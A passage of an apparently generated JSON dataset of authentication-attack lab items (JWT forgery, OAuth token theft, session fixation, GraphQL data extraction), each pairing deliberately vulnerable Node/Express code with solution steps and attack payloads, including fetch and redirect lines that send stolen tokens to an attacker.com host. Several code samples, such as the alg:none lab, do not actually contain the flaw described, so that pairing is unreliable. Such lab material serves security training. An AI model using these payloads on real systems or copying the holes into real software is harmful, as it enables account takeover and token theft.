          "Craft JWT with nested role object: {'role': {'name': 'admin'}}",
          "Sign the modified token using the same algorithm (HS256)",
          "Submit forged token to access admin functionality"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'weak_secret_key');\n    const role = decoded.role?.name || decoded.role;\n    if (role === 'admin') {\n      res.send('Admin dashboard accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6eyJuYW1lIjoiYWRtaW4ifX0.fake_signature",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjp7ImFjY2VzcyI6ImFkbWluIn19.invalid_sig"
        ]
      },
      {
        "Lab scenario": "OAuth token hijacking via state parameter reflection",
        "Lab Description": "The OAuth implementation reflects the state parameter without validation in the redirect URL. The application fails to maintain state server-side. To solve: craft a malicious link that captures victim's OAuth tokens via reflected state.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to analyze OAuth flow and state parameter usage",
          "Construct malicious URL with state parameter containing XSS payload",
          "Social engineer victim to click the link and authenticate",
          "Capture OAuth tokens when victim is redirected to attacker's site",
          "Use stolen tokens to impersonate victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const {code, state} = req.query;\n  res.redirect(`${state}#access_token=fake_token&code=${code}`);\n});\n\napp.listen(3001);",
        "payloads": [
          "https://oauth-server.com/oauth/authorize?response_type=code&client_id=client1&state=https://attacker.com/steal",
          "https://oauth-server.com/oauth/authorize?response_type=token&client_id=client1&state=javascript:fetch('https://attacker.com/log?token='+document.location.hash)"
        ]
      },
      {
        "Lab scenario": "Session fixation via GraphQL WebSocket connection",
        "Lab Description": "The GraphQL subscription endpoint accepts existing session cookies for WebSocket connections without regeneration. The application fails to rotate session identifiers during WebSocket upgrade. To solve: fixate session via HTTP then establish GraphQL subscription with same session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to capture GraphQL WebSocket handshake",
          "Fixate session ID by setting cookie in initial HTTP request",
          "Initiate GraphQL WebSocket connection using same session cookie",
          "Subscribe to privileged data streams using fixated session",
          "Exfiltrate sensitive data via subscription channel"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { createServer } = require('http');\nconst { SubscriptionServer } = require('subscriptions-transport-ws');\nconst { execute, subscribe } = require('graphql');\n\nconst app = express();\nconst sessions = {};\n\napp.use((req, res, next) => {\n  req.sessionId = req.cookies.session || Math.random().toString(36).substring(2);\n  sessions[req.sessionId] = sessions[req.sessionId] || {user: 'guest'};\n  res.cookie('session', req.sessionId);\n  next();\n});\n\napp.post('/login', (req, res) => {\n  sessions[req.sessionId].user = 'admin';\n  res.send('Logged in');\n});\n\nconst server = createServer(app);\n\nSubscriptionServer.create(\n  {\n    execute,\n    subscribe,\n    onConnect: (connectionParams, websocket) => {\n      const sessionId = websocket.upgradeReq.headers.cookie?.match(/session=([^;]+)/)?.[1];\n      return {session: sessions[sessionId]};\n    }\n  },\n  {server}\n);\n\nserver.listen(3002);",
        "payloads": [
          "GET / HTTP/1.1\r\nHost: victim.com\r\nCookie: session=attacker_controlled_id\r\n\r\n",
          "CONNECT /graphql HTTP/1.1\r\nHost: victim.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nCookie: session=fixated_id\r\n\r\n"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion via x5u header injection",
        "Lab Description": "The JWT implementation trusts x5u header to fetch verification certificates without proper validation. The application fails to verify the certificate chain when switching from HMAC to RSA. To solve: host a malicious certificate and force the server to verify tokens using your public key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept valid JWT using Burp Suite and decode structure",
          "Generate RSA key pair and self-signed certificate",
          "Host malicious certificate at attacker-controlled domain",
          "Craft JWT with x5u pointing to your certificate and alg set to RS256",
          "Sign token with your private key and submit to bypass authentication"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/admin', async (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, {complete: true});\n    if (decoded.header.x5u) {\n      const {data: cert} = await axios.get(decoded.header.x5u);\n      jwt.verify(token, cert);\n      if (decoded.payload.role === 'admin') {\n        res.send('Admin access granted');\n        return;\n      }\n    }\n    res.status(403).send('Forbidden');\n  } catch (e) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL21hbGljaW91cy5jZXJ0In0.eyJyb2xlIjoiYWRtaW4ifQ.fake_signature",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5zaXRlL2NlcnQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.invalid_sig"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via insecure postMessage handler",
        "Lab Description": "The OAuth popup implementation uses postMessage without proper origin validation. The application fails to verify the message source when processing OAuth tokens. To solve: craft a malicious page that intercepts tokens via postMessage event listeners.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to analyze OAuth flow in popup window",
          "Create malicious HTML page with postMessage event listener",
          "Social engineer victim to open your page after initiating OAuth",
          "Capture OAuth tokens when they're posted to your window",
          "Use stolen tokens to impersonate victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const {code} = req.query;\n  res.send(`<script>\n    window.opener.postMessage({oauth_token: '${code}'}, '*');\n    window.close();\n  </script>`);\n});\n\napp.listen(3001);",
        "payloads": [
          "<iframe src=\"https://oauth-server.com/oauth/authorize?response_type=token&client_id=victim\"></iframe>\n<script>window.addEventListener('message',e=>{fetch('https://attacker.com/steal?token='+e.data.oauth_token)})</script>",
          "<script>window.open('https://oauth-server.com/oauth/authorize?response_type=code&client_id=victim','oauth','width=500,height=600');\nwindow.addEventListener('message',e=>{document.location='https://attacker.com/exfil?data='+btoa(JSON.stringify(e.data))})</script>"
        ]
      },
      {
        "Lab scenario": "Session fixation via HTTP/2 Server Push headers",
        "Lab Description": "The HTTP/2 implementation pushes session cookies without proper validation. The application assigns session IDs during resource push before authentication. To solve: intercept HTTP/2 push stream to fixate session then authenticate with known credentials.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite with HTTP/2 support to intercept traffic",
          "Analyze Server Push frames for early Set-Cookie headers",
          "Capture and reuse pushed session ID before authentication",
          "Authenticate with valid credentials using fixated session",
          "Access privileged resources with established session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst spdy = require('spdy');\nconst app = express();\n\napp.use((req, res, next) => {\n  if (!req.cookies.session) {\n    res.set('Link', '</styles.css>; rel=preload; as=style');\n    res.cookie('session', Math.random().toString(36).substring(2));\n  }\n  next();\n});\n\napp.post('/login', (req, res) => {\n  if (req.body.user === 'admin' && req.body.pass === 'S3cr3t!') {\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\nconst server = spdy.createServer({}, app);\nserver.listen(3002, () => {\n  console.log('HTTP/2 server running');\n});",
        "payloads": [
          "GET / HTTP/2\r\nHost: victim.com\r\n\r\n",
          "POST /login HTTP/2\r\nHost: victim.com\r\nCookie: session=attacker_controlled_id\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=admin&pass=S3cr3t!"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "This lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT token using Burp Suite while logging in as a low-privilege user",
          "Decode the token using jwt.io or Burp's Decoder to analyze its structure",
          "Modify the algorithm header to 'none' and remove the signature section",
          "Change the 'role' claim from 'user' to 'admin' in the payload",
          "Send the modified token in the Authorization header to access admin endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'admin123', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretkey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'secretkey', { algorithms: ['HS256'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin dashboard');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
          "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTU5MjIwODB9."
        ]
      },
      {
        "Lab scenario": "GraphQL query abuse in user profile API",
        "Lab Description": "This lab's GraphQL endpoint exposes sensitive user information through introspection and lacks proper rate limiting. The application allows unlimited query depth that can lead to data leakage. To solve: extract all user credentials through a crafted GraphQL query.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to send introspection queries to discover the GraphQL schema",
          "Identify sensitive fields in the User type through schema analysis",
          "Craft a recursive query to fetch all user data in a single request",
          "Use query batching to bypass rate limiting by sending multiple queries in one request",
          "Extract password hashes and crack them using John the Ripper"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type User {\n    id: ID!\n    username: String!\n    email: String!\n    passwordHash: String!\n    isAdmin: Boolean!\n  }\n  \n  type Query {\n    users: [User]\n    user(id: ID!): User\n  }\n`);\n\nconst root = {\n  users: () => db.getUsers(),\n  user: ({id}) => db.getUserById(id)\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
        "payloads": [
          "query { users { username passwordHash } }",
          "query { __schema { types { name fields { name } } } }",
          "[{\"query\":\"query { user(id: 1) { username passwordHash } }\"}, {\"query\":\"query { user(id: 2) { username passwordHash } }\"}]"
        ]
      },
      {
        "Lab scenario": "OAuth token hijacking through open redirect",
        "Lab Description": "This lab's OAuth implementation is vulnerable to token leakage through an open redirect in the callback URL. The application fails to validate redirect URIs properly. To solve: steal an OAuth token by tricking a user into visiting a malicious link.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify the OAuth authorization endpoint and required parameters",
          "Craft a malicious callback URL pointing to your attacker server",
          "Use social engineering to make the victim visit the crafted URL",
          "Intercept the OAuth token in the redirect using Burp Collaborator",
          "Exchange the authorization code for an access token and access victim resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst oauthConfig = {\n  clientId: 'labClient',\n  clientSecret: 'secret123',\n  authServer: 'http://auth-server/oauth'\n};\n\napp.get('/oauth/callback', (req, res) => {\n  const { code, state } = req.query;\n  const redirectUri = req.cookies.redirect_uri || '/profile';\n  \n  axios.post(`${oauthConfig.authServer}/token`, {\n    code,\n    client_id: oauthConfig.clientId,\n    client_secret: oauthConfig.clientSecret,\n    redirect_uri: redirectUri,\n    grant_type: 'authorization_code'\n  }).then(response => {\n    res.redirect(`${redirectUri}?token=${response.data.access_token}`);\n  }).catch(err => {\n    res.status(500).send('OAuth error');\n  });\n});\n\napp.listen(3000);",
        "payloads": [
          "http://vulnerable-app/oauth/authorize?response_type=code&client_id=labClient&redirect_uri=http://attacker.com/callback&scope=profile",
          "http://vulnerable-app/oauth/authorize?response_type=token&client_id=labClient&redirect_uri=http://attacker.com/callback&scope=email",
          "http://vulnerable-app/oauth/authorize?response_type=code&client_id=labClient&redirect_uri=http://vulnerable-app/oauth/callback?next=http://attacker.com&scope=all"
        ]
      },
      {
        "Lab scenario": "Session fixation in SOAP API authentication",
        "Lab Description": "This lab's SOAP-based authentication system is vulnerable to session fixation attacks. The application assigns session tokens before authentication and doesn't regenerate them after login. To solve: fixate a session token on victim's browser and hijack their authenticated session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept the initial SOAP request to /ws-auth using Burp Suite and note the Set-Cookie header",
          "Craft a malicious link containing your session token and trick the victim to visit it",
          "Monitor active sessions using OWASP ZAP while victim authenticates",
          "Reuse the fixated session token in authenticated SOAP requests",
          "Access privileged endpoints using the hijacked session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst soap = require('soap');\nconst app = express();\n\nlet sessions = {};\n\napp.use('/ws-auth', (req, res) => {\n  const wsdl = `<?xml version=\"1.0\"?>\n<definitions>\n  <message name=\"authRequest\">\n    <part name=\"username\" type=\"xsd:string\"/>\n    <part name=\"password\" type=\"xsd:string\"/>\n  </message>\n</definitions>`;\n  \n  const service = {\n    AuthService: {\n      AuthPort: {\n        authenticate: (args) => {\n          const session = req.headers.cookie?.split('=')[1] || Math.random().toString(36).substring(2);\n          sessions[session] = { user: args.username };\n          return { sessionToken: session };\n        }\n      }\n    }\n  };\n  \n  soap.listen(app, '/ws-auth', service, wsdl);\n});\n\napp.listen(3000);",
        "payloads": [
          "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:auth=\"http://services.auth.com/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <auth:authenticate>\n         <username>victim</username>\n         <password>password123</password>\n      </auth:authenticate>\n   </soapenv:Body>\n</soapenv:Envelope>",
          "Cookie: sessionid=attacker-fixated-token"
        ]
      },
      {
        "Lab scenario": "JWT kid header path traversal in microservice architecture",
        "Lab Description": "This lab's JWT verification microservice is vulnerable to key path traversal through the kid header parameter. The application uses the kid value to load verification keys without proper sanitization. To solve: craft a JWT token that forces the server to use a predictable public key file.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture a valid JWT token using Burp Suite and analyze its structure",
          "Identify the kid header parameter pointing to key storage location",
          "Craft a malicious kid value with directory traversal (../../known/key.pub)",
          "Sign a new token with a predictable RSA private key matching the forced public key path",
          "Use the forged token to access admin API endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (!decoded?.header?.kid) {\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n  \n  try {\n    const key = fs.readFileSync(`/keys/${decoded.header.kid}`);\n    const verified = jwt.verify(token, key);\n    res.json({ access: verified.role === 'admin' ? 'granted' : 'denied' });\n  } catch (err) {\n    res.status(401).json({ error: 'Verification failed' });\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uL2V0Yy9zc2gvc3NoX2hvc3RfcnNhX3B1Yl9rZXkifQ.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2tleXMvZGVmYXVsdC5wdWIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage through verbose error messages",
        "Lab Description": "This lab's OAuth implementation leaks sensitive information through verbose error messages. The application reveals access tokens in stack traces during failed token validation. To solve: trigger error conditions to extract valid tokens from other users.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "Intercept OAuth token validation requests using Burp Suite",
          "Modify token parameters to trigger validation errors",
          "Analyze error responses for leaked token information",
          "Extract valid tokens from verbose error messages",
          "Reuse stolen tokens to access victim resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst tokens = {\n  'valid-token-123': { user: 'admin', scope: ['read', 'write'] },\n  'expired-token-456': { user: 'user1', scope: ['read'] }\n};\n\napp.post('/oauth/validate', (req, res) => {\n  try {\n    const { token } = req.body;\n    if (!token) throw new Error('Token missing');\n    \n    const tokenData = tokens[token];\n    if (!tokenData) throw new Error(`Invalid token: ${token} not found`);\n    \n    res.json({ valid: true, user: tokenData.user });\n  } catch (err) {\n    console.error(err.stack);\n    res.status(500).json({ \n      error: err.message,\n      stack: process.env.DEBUG ? err.stack : undefined,\n      validTokens: process.env.DEBUG ? Object.keys(tokens) : undefined\n    });\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "{\"token\":\"invalid'\"}",
          "{\"token\":{\"$gt\":\"\"}}",
          "{\"token\":null}"
        ]
      },
      {
        "Lab scenario": "JWT role escalation via unsigned key confusion",
        "Lab Description": "This lab's JWT implementation fails to verify the signing algorithm when processing tokens. The application accepts unsigned tokens when expecting RS256-signed ones. To solve: craft a token with admin privileges by exploiting algorithm confusion.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture a valid JWT using Burp Suite and decode it to analyze structure",
          "Extract the public key from the /jwks.json endpoint using Postman",
          "Convert the public key to PEM format using openssl",
          "Craft a new token with alg: HS256 and sign it with the extracted public key",
          "Replace your token with the forged one to gain admin access"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst publicKey = fs.readFileSync('./public.key');\n\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin access granted');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE",
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEyMzQ1Njc4OSJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage through state parameter reflection",
        "Lab Description": "This lab's OAuth flow reflects the state parameter in the URL fragment after redirection. The application fails to validate that the returned state matches the original. To solve: intercept the OAuth flow and modify the state to leak the access token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Initiate OAuth flow while intercepting with Burp Suite",
          "Capture the authorization request and note the state parameter",
          "Modify the redirect_uri to point to an attacker-controlled domain",
          "Craft a malicious state parameter containing XSS payload",
          "Capture the token when victim visits the poisoned URL"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'client123': { secret: 'sec789', redirectUris: ['https://client.com/callback'] }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  \n  if (!clients[client_id]) {\n    return res.status(400).send('Invalid client');\n  }\n  \n  const token = 'leaked-token-' + Math.random().toString(36).substring(2);\n  res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`);\n});\n\napp.listen(3000);",
        "payloads": [
          "https://oauth-provider/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&state=<script>alert(1)</script>",
          "https://oauth-provider/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&state=malicious-payload"
        ]
      },
      {
        "Lab scenario": "Session fixation through GraphQL WebSocket connection",
        "Lab Description": "This lab's GraphQL subscription endpoint assigns session tokens over WebSocket before authentication. The application fails to regenerate tokens after login. To solve: establish a WebSocket connection to fixate a session token, then authenticate to hijack the session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Establish WebSocket connection to /graphql using OWASP ZAP",
          "Note the session token in the connection initialization response",
          "Fixate the token by setting it in a victim's browser",
          "Monitor active subscriptions while victim authenticates",
          "Reuse the WebSocket connection with the fixated token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { createServer } = require('http');\nconst { SubscriptionServer } = require('subscriptions-transport-ws');\nconst { execute, subscribe } = require('graphql');\n\nconst app = express();\nconst server = createServer(app);\n\nserver.listen(4000, () => {\n  new SubscriptionServer({\n    execute,\n    subscribe,\n    onConnect: (connectionParams, webSocket) => {\n      const sessionToken = Math.random().toString(36).substring(2);\n      webSocket.sessionToken = sessionToken;\n      return { sessionToken };\n    }\n  }, {\n    server,\n    path: '/graphql'\n  });\n});",
        "payloads": [
          "{\"type\":\"connection_init\",\"payload\":{}}",
          "{\"id\":\"1\",\"type\":\"start\",\"payload\":{\"query\":\"subscription { authEvents { token } }\"}}"
        ]
      },
      {
        "Lab scenario": "JWT claim injection via nested JSON objects",
        "Lab Description": "This lab's JWT processing incorrectly handles nested JSON objects in claims. The application fails to properly validate claim structures when verifying tokens. To solve: inject a nested 'admin' claim to escalate privileges.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture a valid JWT token using Burp Suite and decode it",
          "Identify the claims structure vulnerable to nested object injection",
          "Craft a new token with malicious nested claims using jwt_tool",
          "Test different nesting structures to bypass validation",
          "Verify admin access by accessing protected endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst secret = 'supersecret';\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, secret);\n    if (decoded.role === 'admin' || decoded.claims?.role === 'admin') {\n      res.send('Admin portal accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImNsYWltcyI6eyJyb2xlIjoiYWRtaW4ifX0.SIGNATURE",
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImF0dHJzIjp7InJvbGUiOiJhZG1pbiJ9fQ.SIGNATURE"
        ]
      },
      {
        "Lab scenario": "OAuth token swapping through parameter pollution",
        "Lab Description": "This lab's OAuth implementation is vulnerable to HTTP parameter pollution during token exchange. The application processes multiple token parameters inconsistently. To solve: inject a second token parameter to swap privileges.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept the OAuth token exchange flow using Burp Suite",
          "Identify where the token parameter is processed",
          "Add a duplicate token parameter with different values",
          "Test different parameter positions (query vs body)",
          "Capture the elevated access token in the response"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst tokens = {\n  'user_token': { scope: 'read' },\n  'admin_token': { scope: 'read write admin' }\n};\n\napp.post('/oauth/token', (req, res) => {\n  const token = req.body.token || req.query.token;\n  if (Array.isArray(token)) {\n    return res.json(tokens[token[1]]);\n  }\n  res.json(tokens[token]);\n});\n\napp.listen(3000);",
        "payloads": [
          "POST /oauth/token?token=user_token&token=admin_token",
          "token=user_token&token=admin_token"
        ]
      },
      {
        "Lab scenario": "Session token leakage through GraphQL batch requests",
        "Lab Description": "This lab's GraphQL endpoint processes batch requests sequentially while maintaining session state. The application leaks session tokens between requests in a batch. To solve: craft a batch query that leaks another user's session token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify the GraphQL batch endpoint using Postman",
          "Craft a batch request with session operations",
          "Include a session token extraction query in the batch",
          "Analyze response for leaked tokens",
          "Reuse captured tokens for session hijacking"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n    setSession(token: String): String\n  }\n`);\n\nconst root = {\n  getSession: () => currentToken,\n  setSession: ({token}) => currentToken = token\n};\n\nlet currentToken = '';\nconst app = express();\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  batch: true\n}));\n\napp.listen(4000);",
        "payloads": [
          "[{\"query\":\"mutation { setSession(token: \\\"victim_token\\\") }\",\"variables\":{}},{\"query\":\"{ getSession }\",\"variables\":{}}]",
          "[{\"query\":\"mutation($tok: String!) { setSession(token: $tok) }\",\"variables\":{\"tok\":\"victim_token\"}},{\"query\":\"{ getSession }\"}]"
        ]
      },
      {
        "Lab scenario": "JWT header parameter injection via URI fragments",
        "Lab Description": "This lab's JWT implementation incorrectly processes URI fragments in the kid header parameter. The application fetches verification keys from untrusted locations when special characters are used. To solve: inject a malicious key URI to forge admin tokens.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite and analyze the header",
          "Identify the kid parameter pointing to key location",
          "Craft a token with kid containing URI fragment (#attacker.com/key.json)",
          "Host a malicious public key at the specified location",
          "Use the forged token to access admin endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/verify', async (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (!decoded?.header?.kid) {\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n  \n  try {\n    const key = await axios.get(`https://keyserver/${decoded.header.kid}`);\n    const verified = jwt.verify(token, key.data);\n    res.json({ access: verified.role === 'admin' ? 'granted' : 'denied' });\n  } catch (err) {\n    res.status(401).json({ error: 'Verification failed' });\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImRlZmF1bHQucHViI2F0dGFja2VyLmNvbS9tYWxpY2lvdXMua2V5In0.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9wYXRoL3RvL2tleSNhdHRhY2tlci5jb20va2V5In0.eyJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
        ]
      },
      {
        "Lab scenario": "OAuth token theft via iframe timing attack",
        "Lab Description": "This lab's OAuth implementation leaks token validity through iframe response times. The application processes valid tokens slower due to database lookups. To solve: measure iframe load times to brute-force active tokens.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify OAuth-protected iframe endpoints using OWASP ZAP",
          "Create a malicious page with multiple hidden iframes",
          "Measure response times for different token values",
          "Analyze timing differences to identify valid tokens",
          "Hijack the session using the identified token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst validTokens = new Set(['secret123', 'admin456']);\n\napp.get('/iframe', (req, res) => {\n  const token = req.query.token;\n  \n  if (validTokens.has(token)) {\n    setTimeout(() => {\n      res.send('Protected content');\n    }, 500); \n  } else {\n    res.send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "<iframe src=\"https://oauth-provider/iframe?token=brute1\" onload=\"timing1=performance.now()\">",
          "<iframe src=\"https://oauth-provider/iframe?token=brute2\" onload=\"timing2=performance.now()\">"
        ]
      },
      {
        "Lab scenario": "Session fixation through WebSocket subprotocol negotiation",
        "Lab Description": "This lab's WebSocket implementation assigns sessions during subprotocol negotiation. The application fails to regenerate session tokens after authentication. To solve: fixate a session during WS handshake then authenticate to hijack.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept WebSocket connections using Burp Suite",
          "Modify Sec-WebSocket-Protocol header to inject session",
          "Establish connection with fixated session token",
          "Monitor active sessions while victim authenticates",
          "Reuse the WebSocket connection with hijacked session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws, req) => {\n  const protocol = req.headers['sec-websocket-protocol'];\n  ws.sessionToken = protocol || Math.random().toString(36).substring(2);\n  \n  ws.on('message', (message) => {\n    if (message === 'AUTH') {\n      ws.authenticated = true;\n    }\n  });\n});",
        "payloads": [
          "Sec-WebSocket-Protocol: fixated-session-token",
          "GET /chat HTTP/1.1\r\nHost: server.example.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Protocol: attacker-token\r\n\r\n"
        ]
      },
      
    {
